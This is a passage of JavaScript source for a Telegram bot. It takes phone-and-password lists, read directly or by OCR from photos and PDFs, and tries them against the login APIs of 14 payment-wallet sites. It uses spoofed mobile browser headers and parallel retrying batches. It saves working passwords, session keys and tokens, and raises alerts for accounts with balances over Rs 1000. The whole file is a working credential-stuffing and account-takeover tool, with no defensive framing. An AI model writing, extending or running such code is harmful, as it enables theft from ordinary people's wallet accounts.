const { Telegraf, Markup } = require('telegraf');
const axios = require('../runtime/site-http.cjs');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { createWorker } = require('tesseract.js');
const { extractCredentialsWithMpin, preserveMpin, formatMpinLookup, readPdfText } = require('./mpin-support.cjs');

function md5(str) { return crypto.createHash('md5').update(String(str)).digest('hex'); }

var DATA_FILE = path.join(require('../runtime/config.cjs').dataDir, 'wallets.json');
var BACKUP_FILE = path.join(require('../runtime/config.cjs').dataDir, 'wallets_backup.json');
var BACKUP_FILE2 = path.join(require('../runtime/config.cjs').dataDir, 'wallets_backup2.json');
var AUTH_FILE = path.join(require('../runtime/config.cjs').dataDir, 'auth.json');
var ADMIN_PASSWORD = require('../runtime/config.cjs').adminPassword;
var BOT_TOKEN = require('../runtime/config.cjs').botToken;
const https = require('https');
const agent = new https.Agent({ family: 4 }); // Force IPv4 to prevent hanging on Windows

var SITES = {
    'olapay': { name: 'OlaPay', api: 'https://api.app-olapay.com', origin: 'https://app-web.app-olapay.com' },
    'swiftwallet': { name: 'SwiftWallet', api: 'https://api.swiftwallet-app.com', origin: 'https://app-web.swiftwallet-app.com' },
    'toppay': { name: 'TopPay', api: 'https://api.toppay-web.com', origin: 'https://app.toppay-web.com' },
    'rswallet': { name: 'RSWallet', api: 'https://api.rswallet-api.com', origin: 'https://app-web.rswallet-api.com' },
    'sharkpay': { name: 'SharkPay', api: 'https://api.sharkpay-app.com', origin: 'https://app-web.sharkpay-app.com' },
    'smartwallet': { name: 'SmartWallet', api: 'https://api.smartwallet-app.com', origin: 'https://app-web.smartwallet-app.com' },
    'paysetu': { name: 'PaySetu', api: 'https://api.paysetu-app.com', origin: 'https://app-web.paysetu-app.com' },
    'showpay': { name: 'ShowPay', api: 'https://api.showpayweb.com', origin: 'https://app-web.showpayweb.com' },
    'atg': { name: 'ATG Game', api: 'https://api.atg-game.com', origin: 'https://app-web.atg-game.com' },
    'penguinpay': { name: 'PenguinPay', api: 'https://api.penguinpay-app.com', origin: 'https://app-web.penguinpay-app.com' },
    'aidpay': { name: 'AidPay', api: 'https://api.aidpay-api.com', origin: 'https://app-web.aidpay-web.com', customHeaders: { 'channel': 'MobiusPe' } },
    'opay': { name: 'OPay', api: 'https://api.opay-app.com', origin: 'https://app-web.opay-app.com' },
    'millerpay': { name: 'MillerPay', api: 'https://api.millerpay-app.com', origin: 'https://app-web.millerpay-app.com' },
    'mobiuspe': { name: 'MobiusPe', api: 'https://api.mobiuspe-app.com', origin: 'https://app-web.mobiuspe-app.com', customHeaders: { 'channel': 'MobiusPe' } }
};

const MENU_TEXT = '👋 *Master Control Panel (14 Sites)*\n\n' +
    '➕ /add — Naya Data daalein\n' +
    '🔍 /scan — 14 sites ek sath check karein\n' +
    '📸 /ocr — Gallery se photo/PDF bhejo, auto scan\n' +
    '👁️ /check — Saved list check karein\n' +
    '✏️ /edit — Entry update karein\n' +
    '💰 /balance — Sabhi saved entries ka balance\n' +
    '🔑 /password — Number daalo, password lo\n' +
    '📋 /list — Saved entries ki list';

// ✅ TRIPLE CRASH-PROOF BACKUP SYSTEM
function loadWallets() {
    if (fs.existsSync(DATA_FILE)) { try { var d = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8')); if (d && Object.keys(d).length > 0) return d; } catch (e) { } }
    if (fs.existsSync(BACKUP_FILE)) { try { var d2 = JSON.parse(fs.readFileSync(BACKUP_FILE, 'utf-8')); if (d2 && Object.keys(d2).length > 0) { fs.writeFileSync(DATA_FILE, JSON.stringify(d2, null, 2)); return d2; } } catch (e) { } }
    if (fs.existsSync(BACKUP_FILE2)) { try { var d3 = JSON.parse(fs.readFileSync(BACKUP_FILE2, 'utf-8')); if (d3 && Object.keys(d3).length > 0) { fs.writeFileSync(DATA_FILE, JSON.stringify(d3, null, 2)); fs.writeFileSync(BACKUP_FILE, JSON.stringify(d3, null, 2)); return d3; } } catch (e) { } }
    return {};
}

function saveWallets(data) {
    try {
        if (!data || Object.keys(data).length === 0) return;
        var str = JSON.stringify(data, null, 2);
        fs.writeFileSync(DATA_FILE, str);
        fs.writeFileSync(BACKUP_FILE, str);
        if (!saveWallets._c) saveWallets._c = 0;
        saveWallets._c++;
        if (saveWallets._c % 5 === 0) fs.writeFileSync(BACKUP_FILE2, str);
    } catch (e) { }
}

function loadAuth() { if (!fs.existsSync(AUTH_FILE)) return []; try { return JSON.parse(fs.readFileSync(AUTH_FILE, 'utf-8')); } catch (e) { return []; } }
function saveAuth(data) { fs.writeFileSync(AUTH_FILE, JSON.stringify(data)); }

function formatBal(bal) {
    var num = parseFloat(bal);
    if (isNaN(num)) return { emoji: '🔴', text: '*N/A*', num: -1 };
    if (num >= 3000) return { emoji: '🚨', text: `*Rs.${bal}* 🔥🔥`, num: num };
    if (num >= 1000) return { emoji: '💎', text: `*Rs.${bal}* 🔥`, num: num };
    if (num > 0) return { emoji: '🟢', text: `*Rs.${bal}* 🔥`, num: num };
    return { emoji: '⚪', text: `*Rs.${bal}*`, num: num };
}

async function splitAndSend(ctx, msg) {
    var maxLen = 3800;
    if (msg.length <= maxLen) {
        await ctx.reply(msg, { parse_mode: 'Markdown' }).catch(async () => {
            await ctx.reply(msg.replace(/\*/g, '').replace(/`/g, ''));
        });
        return;
    }
    var parts = [];
    while (msg.length > maxLen) {
        var cutAt = msg.lastIndexOf('\n', maxLen);
        if (cutAt < 1) cutAt = maxLen;
        parts.push(msg.substring(0, cutAt));
        msg = msg.substring(cutAt).trim();
    }
    if (msg.length > 0) parts.push(msg);
    for (var i = 0; i < parts.length; i++) {
        await ctx.reply(parts[i], { parse_mode: 'Markdown' }).catch(async () => {
            await ctx.reply(parts[i].replace(/\*/g, '').replace(/`/g, ''));
        });
        if (i < parts.length - 1) await new Promise(r => setTimeout(r, 500));
    }
}

function extractCredentials(text) {
    return extractCredentialsWithMpin(text, extractCredentialsLegacy);
}

function extractCredentialsLegacy(text) {
    var lines = text.split('\n').map(l => l.trim()).filter(l => l.length > 3);
    var found = [];
    var phoneRegex = /\b(\d{10})\b/;
    var i = 0;

    while (i < lines.length) {
        var line = lines[i];
        var sameLine = line.match(/(\d{10})\s+(\S{4,})/);
        if (sameLine) {
            found.push({ phone: sameLine[1], password: sameLine[2] });
            i++; continue;
        }
        var phoneMatch = line.match(phoneRegex);
        if (phoneMatch && i + 1 < lines.length) {
            var nextLine = lines[i + 1].trim();
            if (nextLine.length >= 4 && !nextLine.match(/^\d{10}$/)) {
                var passToken = nextLine.split(/\s+/)[0];
                found.push({ phone: phoneMatch[1], password: passToken });
                i += 2; continue;
            }
        }
        var phoneLabel = line.match(/(?:phone|mobile|number|no\.?)[:\s]+(\d{10})/i);
        if (phoneLabel) {
            for (var j = i + 1; j < Math.min(i + 4, lines.length); j++) {
                var passLabel = lines[j].match(/(?:password|pass|pin|pwd)[:\s]+(\S+)/i);
                if (passLabel) {
                    found.push({ phone: phoneLabel[1], password: passLabel[1] });
                    i = j + 1;
                    break;
                }
            }
            i++; continue;
        }
        i++;
    }

    var seen = new Set();
    return found.filter(function (item) {
        var key = item.phone + '_' + item.password;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
}

var bot = new Telegraf(BOT_TOKEN, { handlerTimeout: Infinity, telegram: { agent: agent } });
var userState = {};

function clearState(ctx) {
    var chatId = ctx.chat ? ctx.chat.id : null;
    if (chatId) userState[chatId] = {};
}

function getHeaders(site) {
    var h = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': site.origin,
        'Referer': site.origin + '/',
        'Sec-Ch-Ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
        'Sec-Ch-Ua-Mobile': '?1',
        'Sec-Ch-Ua-Platform': '"Android"',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
    };
    if (site.customHeaders) Object.assign(h, site.customHeaders);
    return h;
}

async function checkSiteWithRetry(siteId, phone, password) {
    var site = SITES[siteId];
    for (var attempt = 1; attempt <= 3; attempt++) {
        try {
            var loginRes = await axios.post(
                site.api + '/app/auth/login',
                { phone: phone, password: password },
                { timeout: 12000, headers: getHeaders(site) }
            );
            if (loginRes.data.code !== 200) {
                var msg = loginRes.data.message || loginRes.data.msg || 'Sync Failed';
                var isRetryable = msg.toLowerCase().includes('try again') || msg.toLowerCase().includes('busy') || msg.toLowerCase().includes('later');
                if (isRetryable && attempt < 3) { await new Promise(r => setTimeout(r, 5000 * attempt)); continue; }
                throw new Error(msg);
            }
            var loginData = loginRes.data.data;
            var ts = Date.now();
            var body = { ts: ts, userId: Number(loginData.userId) };
            var n = Object.entries(body).sort().map(e => e[0] + "=" + e[1]).join("&");
            var h = getHeaders(site);
            h['signature'] = md5(n + "&" + loginData.sessionKey);
            var balRes = await axios.post(site.api + '/app/user/account/wallet', body, { timeout: 12000, headers: h });
            var bal = (balRes.data.data && balRes.data.data.xtoken !== undefined) ? balRes.data.data.xtoken : (balRes.data.data ? balRes.data.data.balance : 'N/A');
            return { success: true, siteId, siteName: site.name, loginData, bal, phone };
        } catch (e) {
            var errMsg = 'Error';
            if (e.code === 'ECONNABORTED' || (e.message && e.message.toLowerCase().includes('timeout'))) errMsg = 'Timeout';
            else if (e.response && e.response.data && (e.response.data.message || e.response.data.msg)) errMsg = e.response.data.message || e.response.data.msg;
            else if (e.message) errMsg = e.message;
            var shouldRetry = errMsg.toLowerCase().includes('try again') || errMsg.toLowerCase().includes('busy') || errMsg.toLowerCase().includes('later') || errMsg.toLowerCase().includes('timeout');
            if (shouldRetry && attempt < 3) { await new Promise(r => setTimeout(r, 5000 * attempt)); continue; }
            return { success: false, siteId, siteName: site.name, errMsg, phone };
        }
    }
    return { success: false, siteId, siteName: SITES[siteId].name, errMsg: 'Failed', phone };
}

async function runGroupedChecks(entries, progressCallback, chatId) {
    var groups = {};
    entries.forEach(function (e) {
        if (!groups[e.siteId]) groups[e.siteId] = [];
        groups[e.siteId].push(e);
    });
    
    var completedCount = 0;
    var totalCount = entries.length;

    var allPromises = Object.keys(groups).map(async function (siteId) {
        var accounts = groups[siteId];
        var results = [];
        
        // Fast parallel processing (5 accounts at a time per site)
        var chunkSize = 5; 
        for (var i = 0; i < accounts.length; i += chunkSize) {
            // Check if /restart was called (abort signal)
            if (chatId && (!userState[chatId] || !userState[chatId].checkingBalance)) {
                break;
            }
            
            var chunk = accounts.slice(i, i + chunkSize);
            var chunkPromises = chunk.map(async acc => {
                var result = await checkSiteWithRetry(acc.siteId, acc.phone, acc.password);
                result.wKey = acc.wKey;
                completedCount++;
                return result;
            });
            
            var chunkResults = await Promise.all(chunkPromises);
            results.push(...chunkResults);
            
            if (progressCallback) progressCallback(completedCount, totalCount);
            
            // Minimal delay between chunks to avoid total block
            await new Promise(r => setTimeout(r, 100)); 
        }
        return results;
    });
    var grouped = await Promise.all(allPromises);
    return grouped.reduce(function (a, b) { return a.concat(b); }, []);
}

async function extractFromImage(imageBuffer) {
    var worker = await createWorker('eng');
    try {
        var { data: { text } } = await worker.recognize(imageBuffer);
        return text;
    } finally {
        await worker.terminate();
    }
}

bot.catch(function (err, ctx) {
    console.error('Bot request failed');
    if (ctx && ctx.chat) ctx.reply('⚠️ Kuch error aaya, dobara try karo.').catch(() => { });
});

bot.use(function (ctx, next) {
    var chatId = ctx.chat ? ctx.chat.id : (ctx.callbackQuery && ctx.callbackQuery.message ? ctx.callbackQuery.message.chat.id : null);
    if (!chatId) return next();
    var text = ctx.message && ctx.message.text ? ctx.message.text.trim() : '';
    // Message contents and account identifiers are intentionally excluded from server logs.
    var authUsers = loadAuth();
    if (text === ADMIN_PASSWORD) {
        if (!authUsers.includes(chatId)) { authUsers.push(chatId); saveAuth(authUsers); }
        ctx.reply('✅ *Access Verified!*\n\n' + MENU_TEXT, { parse_mode: 'Markdown' });
        return;
    }
    if (!authUsers.includes(chatId)) {
        if (ctx.callbackQuery) ctx.answerCbQuery('🔒 Access Denied!', { show_alert: true }).catch(() => { });
        else ctx.reply('🔒 *Bot Locked*\nAdmin Key bhejein:', { parse_mode: 'Markdown' });
        return;
    }
    return next();
});

// ==========================================
// 🤖 COMMANDS
// ==========================================
bot.start(function (ctx) { clearState(ctx); ctx.reply(MENU_TEXT, { parse_mode: 'Markdown' }); });
bot.command('add', function (ctx) { clearState(ctx); userState[ctx.chat.id] = { step: 'add_phone' }; ctx.reply('➕ *Naya Mobile number bhejo:*', { parse_mode: 'Markdown' }); });
bot.command('scan', function (ctx) { clearState(ctx); userState[ctx.chat.id] = { step: 'awaiting_scan_phone' }; ctx.reply('🔍 *Mobile number bhejo (14 sites check honge):*', { parse_mode: 'Markdown' }); });
bot.command('ocr', function (ctx) { clearState(ctx); userState[ctx.chat.id] = { step: 'waiting_ocr_file' }; ctx.reply('📸 *Gallery se photo ya PDF bhejo!*\n\n_Bot automatically phone numbers aur passwords read karke scan karega._', { parse_mode: 'Markdown' }); });
bot.command('password', function (ctx) { clearState(ctx); userState[ctx.chat.id] = { step: 'get_password' }; ctx.reply('🔑 *Mobile number bhejo jiska password chahiye:*', { parse_mode: 'Markdown' }); });

bot.command('check', function (ctx) {
    clearState(ctx);
    var wallets = loadWallets();
    var phones = [...new Set(Object.values(wallets).map(w => w.phone))];
    if (phones.length === 0) return ctx.reply('📭 Koi data saved nahi hai.');
    var buttons = phones.map(p => [Markup.button.callback('📱 ' + p, 'chk_p_' + p)]);
    ctx.reply('Kaunsa check karna hai?', Markup.inlineKeyboard(buttons));
});
bot.command('edit', function (ctx) {
    clearState(ctx);
    var wallets = loadWallets();
    var phones = [...new Set(Object.values(wallets).map(w => w.phone))];
    if (phones.length === 0) return ctx.reply('📭 Koi data saved nahi hai.');
    var buttons = phones.map(p => [Markup.button.callback('✏️ ' + p, 'edt_p_' + p)]);
    ctx.reply('Kisko update karna hai?', Markup.inlineKeyboard(buttons));
});
bot.command('list', function (ctx) {
    clearState(ctx);
    var wallets = loadWallets();
    var keys = Object.keys(wallets);
    if (keys.length === 0) return ctx.reply('📭 Koi data nahi hai.');
    var msg = '📋 *Saved Data (' + keys.length + '):*\n\n';
    for (var i = 0; i < keys.length; i++) { var w = wallets[keys[i]]; msg += (i + 1) + '. *' + SITES[w.siteId].name + '* — `' + w.phone + '`\n'; }
    splitAndSend(ctx, msg);
});

bot.command('balance', async function (ctx) {
    if (userState[ctx.chat.id] && userState[ctx.chat.id].checkingBalance) {
        return ctx.reply('⏳ Pehle wala balance check abhi chal raha hai! (Agar atak gaya hai toh /restart dabayein)');
    }
    clearState(ctx);
    userState[ctx.chat.id] = { checkingBalance: true };

    var wallets = loadWallets();
    var keys = Object.keys(wallets);
    if (keys.length === 0) {
        userState[ctx.chat.id].checkingBalance = false;
        return ctx.reply('📭 Koi data nahi hai. Pehle /scan karo.');
    }

    var statusMsg = await ctx.reply(`⏳ *Balance Check Shuru...*\n📊 Total Accounts: ${keys.length}`, { parse_mode: 'Markdown' });
    var lastEditTime = 0;

    try {
        var entries = keys.map(function (wKey) { var w = wallets[wKey]; return { siteId: w.siteId, phone: w.phone, password: w.password, wKey: wKey }; });
        
        var results = await runGroupedChecks(entries, async (done, total) => {
            var now = Date.now();
            if (now - lastEditTime > 2000) {
                lastEditTime = now;
                var remaining = total - done;
                var text = `⏳ *Live Balance Progress:*\n\n✅ Check ho gaye: ${done}\n🕒 Baki hain: ${remaining}\n📊 Total Accounts: ${total}`;
                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, text, { parse_mode: 'Markdown' }).catch(() => {});
            }
        }, ctx.chat.id);

        var successList = results.filter(r => r.success).map(r => ({ ...r, f: formatBal(r.bal) }));
        var failList = results.filter(r => !r.success);
        successList.sort((a, b) => b.f.num - a.f.num);

        successList.forEach(r => {
            var wKey = r.siteId + '_' + r.phone;
            if (wallets[wKey]) { wallets[wKey].userId = r.loginData.userId; wallets[wKey].sessionKey = r.loginData.sessionKey; wallets[wKey].loginToken = r.loginData.loginToken; }
        });
        saveWallets(wallets);

        var highBal = successList.filter(r => r.f.num >= 1000);
        var normalBal = successList.filter(r => r.f.num >= 5 && r.f.num < 1000);

        var summary = `✅ *${successList.length}/${results.length} accounts check ho gaye!*`;
        if (highBal.length > 0) summary += `\n🏆 *${highBal.length} HIGH BALANCE (1000+) mila!*`;
        if (failList.length > 0) summary += `\n❌ ${failList.length} failed`;
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, summary, { parse_mode: 'Markdown' }).catch(() => { });

        if (highBal.length > 0) {
            var highMsg = '🏆 *HIGH BALANCE (1000+):*\n━━━━━━━━━━━━━━━━━\n';
            highBal.forEach(r => { highMsg += `${r.f.emoji} *${r.siteName}*\n📱 \`${r.phone}\` | 💰 ${r.f.text}\n\n`; });
            await splitAndSend(ctx, highMsg);

            var alertMsg = '🚨 *HIGH BALANCE ALERT* 🚨\n\n';
            highBal.forEach(r => { alertMsg += `🌐 *${r.siteName}*\n📱 \`${r.phone}\`\n💰 ${r.f.text}\n\n`; });
            await ctx.reply(alertMsg, { parse_mode: 'Markdown' });
        }

        if (normalBal.length > 0) {
            var normalMsg = '💰 *Balance Status (Rs 5 se upar):*\n\n';
            normalBal.forEach(r => { normalMsg += `${r.f.emoji} *${r.siteName}*\n📱 \`${r.phone}\` | ${r.f.text}\n\n`; });
            await splitAndSend(ctx, normalMsg);
        } else if (successList.length > 0 && highBal.length === 0) {
            await ctx.reply('⚠️ Check complete, par kisi bhi account mein Rs 5 se upar balance nahi hai.');
        }

        if (failList.length > 0) {
            var failMsg = '❌ *Failed (' + failList.length + '):*\n';
            failList.forEach(r => { failMsg += `• *${r.siteName}* \`${r.phone}\` — ${r.errMsg}\n`; });
            await splitAndSend(ctx, failMsg);
        }
    } catch (e) {
        await ctx.reply('❌ Balance check mein error: ' + e.message).catch(() => { });
    }
    
    if (userState[ctx.chat.id]) userState[ctx.chat.id].checkingBalance = false;
    await ctx.reply('━━━━━━━━━━━━━━━━━\n' + MENU_TEXT, { parse_mode: 'Markdown' });
});

// ==========================================
// 📸 MULTI-PHOTO QUEUE SYSTEM
// ==========================================
var photoBufferList = [];
var batchOcrTimer = null;
var firstPhotoCtx = null;

bot.on('photo', async function (ctx) {
    var photos = ctx.message.photo;
    var bestPhoto = photos[photos.length - 1];

    photoBufferList.push({ file_id: bestPhoto.file_id });
    if (!firstPhotoCtx) firstPhotoCtx = ctx;

    if (batchOcrTimer) clearTimeout(batchOcrTimer);
    
    batchOcrTimer = setTimeout(() => {
        processBulkPhotos(firstPhotoCtx);
    }, 3000);
});

async function processBulkPhotos(ctx) {
    var photosToProcess = [...photoBufferList];
    photoBufferList = [];
    firstPhotoCtx = null;
    batchOcrTimer = null;
    var chatId = ctx.chat.id;

    var waitMsg = await ctx.reply(`📸 *${photosToProcess.length} Photos Received!*\nText extract ho raha hai...`, { parse_mode: 'Markdown' });

    try {
        var allText = "";
        for (let i = 0; i < photosToProcess.length; i++) {
            if (i % 2 === 0) {
                await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, `🔍 Extracting Text... (${i + 1}/${photosToProcess.length} photos processed)`, { parse_mode: 'Markdown' }).catch(() => {});
            }
            var fileLink = await ctx.telegram.getFileLink(photosToProcess[i].file_id);
            var response = await axios.get(fileLink.href, { responseType: 'arraybuffer', timeout: 30000 });
            var imageBuffer = Buffer.from(response.data);
            var text = await extractFromImage(imageBuffer);
            allText += "\n" + text;
        }

        var creds = extractCredentials(allText);

        if (creds.length === 0) {
            return await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, '❌ *Koi phone+password nahi mila!*\nImage clear honi chahiye.', { parse_mode: 'Markdown' }).catch(() => {});
        }

        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, `⏳ *${creds.length} numbers mili. Auto Scan Shuru (14 Sites)...*`, { parse_mode: 'Markdown' }).catch(() => {});

        var wallets = loadWallets();
        var totalSaved = 0;
        var totalHigh = [];

        for (var i = 0; i < creds.length; i++) {
            var item = creds[i];
            var progressMsg = await ctx.reply(`⏳ *(${i + 1}/${creds.length})* \`${item.phone}\` scan ho raha hai...`, { parse_mode: 'Markdown' });

            var siteKeys = Object.keys(SITES);
            var entries = siteKeys.map(siteId => ({ siteId, phone: item.phone, password: item.password, wKey: siteId + '_' + item.phone }));
            var results = await runGroupedChecks(entries);

            var successCount = 0;
            var report = `📱 *${item.phone}* Result:\n\n`;

            results.forEach(r => {
                if (r.success) {
                    wallets[r.siteId + '_' + item.phone] = { siteId: r.siteId, phone: item.phone, password: item.password, userId: r.loginData.userId, loginToken: r.loginData.loginToken, sessionKey: r.loginData.sessionKey, ...preserveMpin(wallets[r.siteId + '_' + item.phone], item.mpin), addedAt: new Date().toISOString() };
                    var f = formatBal(r.bal);
                    report += `${f.emoji} *${r.siteName}* — ${f.text}\n`;
                    if (f.num >= 1000) totalHigh.push({ ...r, f });
                    successCount++;
                    totalSaved++;
                }
            });

            saveWallets(wallets);

            if (successCount === 0) report += '❌ Koi site login nahi hua';
            else report += `\n💾 ${successCount} sites saved`;

            await ctx.telegram.editMessageText(chatId, progressMsg.message_id, undefined, report, { parse_mode: 'Markdown' }).catch(() => { });
            if (i < creds.length - 1) await new Promise(r => setTimeout(r, 1000));
        }

        var finalMsg = `✅ *Ek Sath Photo Ka Scan Complete!*\n\n📱 ${creds.length} numbers scan kiye\n💾 ${totalSaved} total entries saved`;
        if (totalHigh.length > 0) finalMsg += `\n🏆 ${totalHigh.length} HIGH BALANCE mila!`;
        await ctx.reply(finalMsg, { parse_mode: 'Markdown' });

        if (totalHigh.length > 0) {
            var alertMsg = '🚨 *HIGH BALANCE ALERT* 🚨\n\n';
            totalHigh.forEach(r => { alertMsg += `🌐 *${r.siteName}*\n📱 \`${r.phone}\`\n💰 ${r.f.text}\n\n`; });
            await ctx.reply(alertMsg, { parse_mode: 'Markdown' });
        }

    } catch (e) {
        console.error('OCR request failed');
        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, '❌ Image padhne mein error: ' + e.message, { parse_mode: 'Markdown' }).catch(() => { });
    }
}

// ==========================================
// 📄 PDF/DOCUMENT HANDLER
// ==========================================
bot.on('document', async function (ctx) {
    var chatId = ctx.chat.id;
    var doc = ctx.message.document;

    var waitMsg = await ctx.reply('📄 *File read ho rahi hai...*', { parse_mode: 'Markdown' });

    try {
        var fileLink = await ctx.telegram.getFileLink(doc.file_id);
        var response = await axios.get(fileLink.href, { responseType: 'arraybuffer', timeout: 30000 });
        var buffer = Buffer.from(response.data);

        var extractedText = '';

        if (doc.mime_type === 'application/pdf') {
            extractedText = await readPdfText(buffer);
        } else if (doc.mime_type && doc.mime_type.startsWith('image/')) {
            extractedText = await extractFromImage(buffer);
        } else {
            extractedText = buffer.toString('utf-8');
        }

        var creds = extractCredentials(extractedText);

        if (creds.length === 0) {
            await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, '❌ *Koi phone+password nahi mila!*\n\nFormat hona chahiye:\n`9876543210 Password@123`', { parse_mode: 'Markdown' }).catch(() => { });
            return;
        }

        userState[chatId] = { step: 'ocr_confirm', ocrData: creds };

        var msg = `📄 *${creds.length} entries mili:*\n\n`;
        creds.forEach((item, i) => { msg += `${i + 1}. \`${item.phone}\` — \`${item.password}\`\nMPIN: ${item.mpin ? "`" + item.mpin + "`" : (item.mpinConflict ? "Conflicting values - not updated" : "Not found - saved MPIN kept")}\n`; });
        msg += '\n_Scan karo?_';

        var buttons = [
            [Markup.button.callback('✅ Scan Karo (14 Sites Each)', 'ocr_scan_all')],
            [Markup.button.callback('❌ Cancel', 'ocr_cancel')]
        ];

        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) }).catch(async () => {
            await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
        });

    } catch (e) {
        console.error('Document request failed');
        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, undefined, '❌ File error: ' + e.message, { parse_mode: 'Markdown' }).catch(() => { });
    }
});

// ==========================================
// 🖱️ OCR ACTIONS (For PDF only now)
// ==========================================
bot.action('ocr_cancel', function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    userState[ctx.chat.id] = {};
    ctx.editMessageText('❌ Cancel kar diya.').catch(() => { });
});

bot.action('ocr_scan_all', async function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var chatId = ctx.callbackQuery.message.chat.id;
    var state = userState[chatId] || {};
    var ocrData = state.ocrData || [];
    if (ocrData.length === 0) return ctx.editMessageText('❌ Data nahi mila.');
    userState[chatId] = {};

    await ctx.editMessageText(`⏳ *${ocrData.length} numbers ka scan shuru...*`, { parse_mode: 'Markdown' }).catch(() => { });

    var wallets = loadWallets();
    var totalSaved = 0;
    var totalHigh = [];

    for (var i = 0; i < ocrData.length; i++) {
        var item = ocrData[i];
        var progressMsg = await ctx.reply(`⏳ *(${i + 1}/${ocrData.length})* \`${item.phone}\` scan ho raha hai...`, { parse_mode: 'Markdown' });

        var siteKeys = Object.keys(SITES);
        var entries = siteKeys.map(siteId => ({ siteId, phone: item.phone, password: item.password, wKey: siteId + '_' + item.phone }));
        var results = await runGroupedChecks(entries);

        var successCount = 0;
        var report = `📱 *${item.phone}* Result:\n\n`;

        results.forEach(r => {
            if (r.success) {
                wallets[r.siteId + '_' + item.phone] = { siteId: r.siteId, phone: item.phone, password: item.password, userId: r.loginData.userId, loginToken: r.loginData.loginToken, sessionKey: r.loginData.sessionKey, ...preserveMpin(wallets[r.siteId + '_' + item.phone], item.mpin), addedAt: new Date().toISOString() };
                var f = formatBal(r.bal);
                report += `${f.emoji} *${r.siteName}* — ${f.text}\n`;
                if (f.num >= 1000) totalHigh.push({ ...r, f });
                successCount++;
                totalSaved++;
            }
        });

        saveWallets(wallets);

        if (successCount === 0) report += '❌ Koi site login nahi hua';
        else report += `\n💾 ${successCount} sites saved`;

        await ctx.telegram.editMessageText(chatId, progressMsg.message_id, undefined, report, { parse_mode: 'Markdown' }).catch(() => { });
        if (i < ocrData.length - 1) await new Promise(r => setTimeout(r, 1000));
    }

    var finalMsg = `✅ *Scan Complete!*\n\n📱 ${ocrData.length} numbers scan kiye\n💾 ${totalSaved} total entries saved`;
    if (totalHigh.length > 0) finalMsg += `\n🏆 ${totalHigh.length} HIGH BALANCE mila!`;
    await ctx.reply(finalMsg, { parse_mode: 'Markdown' });

    if (totalHigh.length > 0) {
        var alertMsg = '🚨 *HIGH BALANCE ALERT* 🚨\n\n';
        totalHigh.forEach(r => { alertMsg += `🌐 *${r.siteName}*\n📱 \`${r.phone}\`\n💰 ${r.f.text}\n\n`; });
        await ctx.reply(alertMsg, { parse_mode: 'Markdown' });
    }

    await ctx.reply('━━━━━━━━━━━━━━━━━\n' + MENU_TEXT, { parse_mode: 'Markdown' });
});

// ==========================================
// 🖱️ OTHER ACTIONS
// ==========================================
bot.action(/^add_s_([^_]+)$/, async function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var siteId = ctx.match[1];
    var chatId = ctx.callbackQuery.message.chat.id;
    var state = userState[chatId] || {};
    if (!state.phone || !state.password) return ctx.editMessageText('❌ Session timeout. Dobara /add chalayein.');
    ctx.editMessageText('⏳ Sync kar raha hoon *' + SITES[siteId].name + '*...', { parse_mode: 'Markdown' });
    var r = await checkSiteWithRetry(siteId, state.phone, state.password);
    if (r.success) {
        var wallets = loadWallets();
        wallets[siteId + '_' + state.phone] = { siteId, phone: state.phone, password: state.password, userId: r.loginData.userId, loginToken: r.loginData.loginToken, sessionKey: r.loginData.sessionKey, ...preserveMpin(wallets[siteId + '_' + state.phone]), addedAt: new Date().toISOString() };
        saveWallets(wallets);
        var f = formatBal(r.bal);
        await ctx.editMessageText(`${f.emoji} *${r.siteName} Login Success!*\n📱 \`${r.phone}\`\n👤 ID: \`${r.loginData.userId}\`\n💰 ${f.text}\n\n💾 Saved!`, { parse_mode: 'Markdown' });
        if (f.num >= 3000) ctx.reply('🚨 *HIGH BALANCE!*\n' + r.siteName + '\n📱 `' + r.phone + '`\n💰 Rs.' + r.bal, { parse_mode: 'Markdown' });
    } else {
        ctx.editMessageText('❌ *' + r.siteName + '* Failed!\n📱 `' + r.phone + '`\n' + r.errMsg, { parse_mode: 'Markdown' });
    }
    clearState(ctx);
});

bot.action(/^chk_p_(.+)$/, function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var phone = ctx.match[1];
    var wallets = loadWallets();
    var savedSites = Object.values(wallets).filter(w => w.phone === phone);
    var buttons = savedSites.map(w => [Markup.button.callback('🌐 ' + SITES[w.siteId].name, 'chk_s_' + w.siteId + '_' + phone)]);
    ctx.editMessageText('📱 `' + phone + '` ke liye select karein:', Markup.inlineKeyboard(buttons));
});

bot.action(/^chk_s_([^_]+)_(.+)$/, async function (ctx) {
    ctx.answerCbQuery().catch(() => { });
    var siteId = ctx.match[1];
    var phone = ctx.match[2];
    var wKey = siteId + '_' + phone;
    var wallets = loadWallets();
    var w = wallets[wKey];
    if (!w) return ctx.editMessageText('❌ Data nahi mila.');
    ctx.editMessageText('⏳ Sync kar raha hoon...');
    var r = await checkSiteWithRetry(siteId, w.phone, w.password);
    if (r.success) {
        wallets[wKey].userId = r.loginData.userId;
        wallets[wKey].sessionKey = r.loginData.sessionKey;
        wallets[wKey].loginToken = r.loginData.loginToken;
        saveWallets(wallets);
        var f = formatBal(r.bal);
